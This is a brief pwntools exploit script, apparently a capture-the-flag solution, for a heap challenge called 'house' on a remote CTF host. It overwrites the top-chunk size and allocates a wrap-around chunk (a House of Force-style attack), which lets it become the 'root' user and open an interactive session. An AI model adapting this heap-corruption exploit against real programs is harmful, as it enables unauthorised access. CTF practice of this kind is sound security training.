from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('house')
p = elf.process()
p = remote('house.nc.jctf.pro', 1337)
cmd = """
set resolve-heap-via-heuristic force
"""
#gdb.attach(p,cmd)

def malloc(u,pw,s):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b': ', u)
    p.sendlineafter(b': ', pw)
    p.sendline(str(s).encode())

malloc(b'\x00'*24, b'\0' * 24 + p64((1<<64)-1), 24)
malloc(b'\x00'*24, b'\0', ((1<<64)-(440)))
malloc(b'root',b'root', 24)
p.sendlineafter(b'>> ', b'2')

p.interactive()
